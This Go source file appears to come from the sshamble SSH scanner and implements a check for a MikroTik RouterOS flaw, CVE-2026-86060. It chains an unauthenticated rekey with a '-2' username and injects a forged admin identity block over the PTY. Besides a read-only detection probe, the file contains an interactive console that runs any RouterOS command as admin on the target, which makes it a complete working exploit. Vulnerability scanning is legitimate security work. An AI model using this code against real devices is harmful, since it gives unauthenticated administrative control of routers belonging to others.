package cmd

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"golang.org/x/term"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnMikrotikFD2Inject = "vuln-mikrotik-fd2-inject"

// CVE-2026-86060 (MikroTrick): the RouterOS SSH login helper parses a
// positional argv starting with '-' as '-<fd>' and reads the trusted
// (name, policy-mask) fields from that descriptor. A username of "-2" makes
// the helper read them from the PTY, letting the client inject an arbitrary
// identity with the full policy mask. Combined with the CVE-2026-67279
// pre-auth rekey (which opens the session channel without authentication),
// this yields an unauthenticated full-admin RouterOS console.
// Fixed in 7.24.2 / 7.23.4 / 6.49.21.
//
// Detection: present username "-2" with 'none' auth (rejected, but the
// username stays pending), request a rekey, open a session, request a PTY +
// shell, and write the canonical-PTY fd-2 block (name \0 policy \0 VEOF
// VEOF). Only then does the login helper spawn a RouterOS console: the
// channel open alone (CVE-2026-67279) produces no console, and the same
// injection without the pending "-2" username is ignored, so the console
// prompt is specific to CVE-2026-86060. No credentials are needed and the
// check only runs a read-only "/system resource print".
//
// https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/

// mikrotikFD2Block is the injected (name, policy) record read by the login
// helper from fd 2: "admin" \0 4294967295 \0 VEOF VEOF. The trailing VEOF
// bytes terminate canonical-mode line editing on the PTY.
var mikrotikFD2Block = []byte("admin\x004294967295\x00\x04\x04")

var (
	mikrotikFD2ANSIRe   = regexp.MustCompile("\x1b(?:\\[[0-?]*[ -/]*[@-~]|.)")
	mikrotikFD2PromptRe = regexp.MustCompile(`@[^\[\]]{0,40}\]>`)
)

// mikrotikFD2Squashed strips ANSI escapes and all whitespace from console
// output, so prompt detection still works when the console renders
// vertically (one character per line).
func mikrotikFD2Squashed(raw []byte) string {
	plain := mikrotikFD2ANSIRe.ReplaceAll(raw, nil)
	plain = bytes.ReplaceAll(plain, []byte("\r"), nil)
	return strings.Join(strings.Fields(string(plain)), "")
}

// mikrotikFD2QuerySeqs are the terminal-query escape sequences the RouterOS
// console emits to probe the terminal. We answer them ourselves and keep them
// off the user's terminal; otherwise the terminal emulator replies on stdin,
// corrupting the command stream and eventually closing the session.
var mikrotikFD2QuerySeqs = [][]byte{
	[]byte("\x1b[6n"), // DSR: report cursor position
	[]byte("\x1bZ"),   // DECID: report device attributes
}

// mikrotikFD2TerminalFilter removes the query sequences from console output
// before it is displayed. It tolerates sequences split across calls by
// buffering trailing bytes that could begin a query.
type mikrotikFD2TerminalFilter struct {
	pend []byte
}

func (f *mikrotikFD2TerminalFilter) maxSeq() int {
	m := 0
	for _, q := range mikrotikFD2QuerySeqs {
		if len(q) > m {
			m = len(q)
		}
	}
	return m
}

func (f *mikrotikFD2TerminalFilter) Filter(p []byte) []byte {
	buf := append(f.pend, p...)
	f.pend = f.pend[:0]
	maxSeq := f.maxSeq()
	out := make([]byte, 0, len(buf))
	for len(buf) > 0 {
		stripped := false
		for _, q := range mikrotikFD2QuerySeqs {
			if bytes.HasPrefix(buf, q) {
				buf = buf[len(q):]
				stripped = true
				break
			}
		}
		if stripped {
			continue
		}
		// Hold back a trailing run that could begin a query sequence.
		if len(buf) < maxSeq && f.isPrefix(buf) {
			f.pend = append(f.pend, buf...)
			break
		}
		out = append(out, buf[0])
		buf = buf[1:]
	}
	return out
}

func (f *mikrotikFD2TerminalFilter) isPrefix(b []byte) bool {
	for _, q := range mikrotikFD2QuerySeqs {
		if len(b) < len(q) && bytes.HasPrefix(q, b) {
			return true
		}
	}
	return false
}

// mikrotikFD2Options builds the base auth options that perform the
// unauthenticated pre-auth rekey (CVE-2026-67279) with the rejected "-2"
// username pending (CVE-2026-86060). The caller supplies the session handler.
func mikrotikFD2Options(addr string, conf *ScanConfig, options *auth.Options) *auth.Options {
	tname := checkVulnMikrotikFD2Inject
	return options.
		WithUsername("-2").
		WithIgnoreAuthError().
		WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
			// CVE-2026-67279: enter the connection protocol unauthenticated,
			// leaving the rejected "-2" username pending for the login helper.
			return mikrotikRequestRekey(addr, conf, tname, uac)
		})
}

// mikrotikFD2OpenConsole requests a pty + shell on ses, injects the fd-2
// identity block, and returns the session's stdin pipe.
func mikrotikFD2OpenConsole(ses *ssh.Session) (io.WriteCloser, error) {
	stdIn, err := ses.StdinPipe()
	if err != nil {
		return nil, err
	}
	if err := ses.RequestPty("vt100", 24, 80, ssh.TerminalModes{}); err != nil {
		return nil, err
	}
	if err := ses.Shell(); err != nil {
		return nil, err
	}
	if _, err := stdIn.Write(mikrotikFD2Block); err != nil {
		return nil, err
	}
	return stdIn, nil
}

// mikrotikFD2AnswerProbes answers any DECID/CPR terminal probes and any [Y/n]
// nag present in raw, updating the counters so each is answered exactly once.
func mikrotikFD2AnswerProbes(raw []byte, cprAnswered *int, decidAnswered, nagAnswered *bool, w io.Writer) error {
	if !*decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
		*decidAnswered = true
		_, _ = w.Write([]byte("\x1b[?1;2c"))
	}
	if n := bytes.Count(raw, []byte("\x1b[6n")); *cprAnswered < n {
		for *cprAnswered < n {
			*cprAnswered = *cprAnswered + 1
			if _, err := w.Write([]byte("\x1b[24;80R")); err != nil {
				return err
			}
		}
	}
	if !*nagAnswered && strings.Contains(mikrotikFD2Squashed(raw), "[Y/n]") {
		*nagAnswered = true
		_, _ = w.Write([]byte("n"))
	}
	return nil
}

// mikrotikFD2DriveConsole answers the RouterOS console's DECID/CPR terminal
// probes and any [Y/n] nag until the admin prompt appears, then returns nil.
// The console's initial handshake must complete before the first command is
// sent; sending input too early breaks the console and closes the session.
func mikrotikFD2DriveConsole(stdOut *auth.SyncByteBuffer, w io.Writer, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	cprAnswered := 0
	decidAnswered := false
	nagAnswered := false
	for time.Now().Before(deadline) {
		raw := stdOut.Peek()
		if err := mikrotikFD2AnswerProbes(raw, &cprAnswered, &decidAnswered, &nagAnswered, w); err != nil {
			return err
		}
		if mikrotikFD2PromptRe.MatchString(mikrotikFD2Squashed(raw)) {
			return nil
		}
		time.Sleep(time.Millisecond * 50)
	}
	return fmt.Errorf("no RouterOS console prompt")
}

// mikrotikFD2RunCommand establishes a fresh unauthenticated fd-2 console, runs
// cmd, and returns the cleaned console output. RouterOS does not keep the
// injected PTY console usable across commands on a persistent session, so each
// command re-runs the one-shot sequence proven by the detection check: rekey,
// pty+shell, fd-2 identity injection, drive to the prompt, then one command.
func mikrotikFD2RunCommand(addr string, conf *ScanConfig, options *auth.Options, cmd string) (string, error) {
	tname := checkVulnMikrotikFD2Inject

	o := mikrotikFD2Options(addr, conf, options).
		WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
			_ = c.SetDeadline(time.Now().Add(time.Second * 25))

			stdOut := auth.NewSyncByteBuffer(1024 * 64)
			ses.Stdout = stdOut
			ses.Stderr = stdOut
			stdIn, err := mikrotikFD2OpenConsole(ses)
			if err != nil {
				return err
			}
			if err := mikrotikFD2DriveConsole(stdOut, stdIn, 20*time.Second); err != nil {
				return err
			}

			mark := len(mikrotikFD2Squashed(stdOut.Peek()))
			if _, err := stdIn.Write([]byte(cmd + "\r")); err != nil {
				return err
			}

			// Wait for the prompt to reappear (command complete) or a timeout.
			deadline := time.Now().Add(10 * time.Second)
			for time.Now().Before(deadline) {
				squashed := mikrotikFD2Squashed(stdOut.Peek())
				if len(squashed) > mark && mikrotikFD2PromptRe.MatchString(squashed[mark:]) {
					break
				}
				time.Sleep(time.Millisecond * 50)
			}
			r.SessionOutput = auth.CleanSessionOutput(stdOut.Peek())
			return nil
		})

	var res *auth.AuthResult
	for attempt := 1; attempt <= 3; attempt++ {
		res = auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
		if res.Stage == "session" {
			break
		}
		conf.Logger.Debugf("%s %s run command attempt %d failed (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
		time.Sleep(time.Second)
	}
	if res.Stage != "session" || res.SessionOutput == "" {
		return "", fmt.Errorf("unable to establish console: %v", res.Error)
	}
	return res.SessionOutput, nil
}

// mikrotikFD2Display prepares raw console output for the terminal: strips ANSI
// escapes, normalizes CR to LF, drops the injected identity echo and startup
// log spam by starting at the command echo, and removes RouterOS prompt lines.
func mikrotikFD2Display(cmd, raw string) string {
	b := mikrotikFD2ANSIRe.ReplaceAll([]byte(raw), nil)
	b = bytes.ReplaceAll(b, []byte("\r"), []byte("\n"))
	b = bytes.ReplaceAll(b, []byte{0}, nil)
	s := string(b)

	if idx := strings.Index(s, cmd); idx >= 0 {
		s = s[idx:]
	}

	var out []string
	for _, ln := range strings.Split(s, "\n") {
		t := strings.TrimSpace(ln)
		if t == "" {
			continue
		}
		// Drop RouterOS prompt lines ("[0@host] >").
		if strings.HasPrefix(t, "[") && strings.HasSuffix(t, ">") {
			continue
		}
		out = append(out, strings.TrimRight(ln, " \t"))
	}
	return strings.Join(out, "\n")
}

// sshInteractVulnMikrotikFD2Inject drives the unauthenticated CVE-2026-86060
// RouterOS admin console as a line-based repl. Each command establishes a fresh
// fd-2 console because RouterOS terminates the injected PTY console rather than
// keeping it usable across commands.
func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikFD2Inject

	if fd := int(os.Stdin.Fd()); !term.IsTerminal(fd) {
		conf.Logger.Errorf("%s %s interact requires a controlling terminal", addr, tname)
		return nil
	}

	fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
	fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("[admin@%s] > ", addr)
		line, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Printf("\r\n")
				return nil
			}
			conf.Logger.Errorf("%s %s stdin read failed: %v", addr, tname, err)
			return nil
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		switch strings.ToLower(line) {
		case "exit", "quit", ".":
			return nil
		}

		out, err := mikrotikFD2RunCommand(addr, conf, options, line)
		if err != nil {
			conf.Logger.Errorf("%s %s cannot run %q: %v", addr, tname, line, err)
			continue
		}
		display := mikrotikFD2Display(line, out)
		if display == "" {
			fmt.Printf("(no output)\r\n")
		} else {
			_, _ = os.Stdout.WriteString(display)
			_, _ = os.Stdout.WriteString("\r\n")
			os.Stdout.Sync()
		}
	}
}

func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikFD2Inject
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running", addr, tname)

	o := mikrotikFD2Options(addr, conf, options).
		WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
			_ = c.SetDeadline(time.Now().Add(time.Second * 25))

			stdOut := auth.NewSyncByteBuffer(1024 * 64)
			ses.Stdout = stdOut
			ses.Stderr = stdOut
			stdIn, err := mikrotikFD2OpenConsole(ses)
			if err != nil {
				return err
			}

			// Drive the console to the admin prompt, answering its DECID/CPR
			// terminal probes, before running the read-only proof command.
			if err := mikrotikFD2DriveConsole(stdOut, stdIn, 20*time.Second); err != nil {
				return err
			}
			mark := len(mikrotikFD2Squashed(stdOut.Peek()))
			if _, err := stdIn.Write([]byte("/system resource print\r")); err != nil {
				return err
			}

			// Wait for the proof output to appear after the prompt.
			deadline := time.Now().Add(10 * time.Second)
			for time.Now().Before(deadline) {
				squashed := mikrotikFD2Squashed(stdOut.Peek())
				if strings.Contains(squashed[mark:], "version:") {
					r.SessionOutput = auth.CleanSessionOutput(stdOut.Peek())
					return nil
				}
				time.Sleep(time.Millisecond * 50)
			}
			return fmt.Errorf("no RouterOS console output after fd-2 injection")
		})

	// ssh.None() is rejected as expected; IgnoreAuthError keeps the
	// connection open so the rekey + channel open follow. The rekey/channel-open
	// ordering is racy, so retry a few times before giving up.
	var res *auth.AuthResult
	for attempt := 1; attempt <= 3; attempt++ {
		res = auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
		if res.Stage == "session" {
			break
		}
		conf.Logger.Debugf("%s %s attempt %d did not open a session (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
		time.Sleep(time.Second)
	}
	if res.Stage != "session" {
		conf.Logger.Debugf("%s %s did not open a session: %v", addr, tname, res.Error)
		return nil
	}
	if res.SessionOutput == "" {
		// The channel opened (CVE-2026-67279 territory) but the fd-2
		// injection produced no console, so CVE-2026-86060 does not apply.
		conf.Logger.Debugf("%s %s session opened but no console appeared: %v", addr, tname, res.Error)
		return nil
	}

	// Attribute to RouterOS before naming the CVE: either the server banner
	// (SSH-2.0-ROSSSH) or the proof command output must look like RouterOS.
	if !mikrotikPreauthRekeyIsRouterOS(res.Version, res.SessionOutput) {
		conf.Logger.Warnf("%s %s console appeared after fd-2 injection, but the service (%q) does not look like RouterOS; not reporting CVE-2026-86060", addr, tname, res.Version)
		return nil
	}

	version := mikrotikParseRouterOSVersion(res.SessionOutput)
	conf.Logger.Warnf("%s %s unauthenticated full-admin console via '-2' fd injection", addr, tname)
	if version != "" {
		conf.Logger.Infof("%s %s RouterOS version: %s", addr, tname, version)
	}

	proof := fmt.Sprintf("CVE-2026-86060: unauthenticated RouterOS console via '-2' login-helper fd injection (server: %s)", res.Version)
	if version != "" {
		proof += fmt.Sprintf(". RouterOS version: %s", version)
	}

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
		Proof: proof,
	})

	res.SessionMethod = tname
	root.SessionMethod = tname
	root.SessionOutput = res.SessionOutput

	return res
}
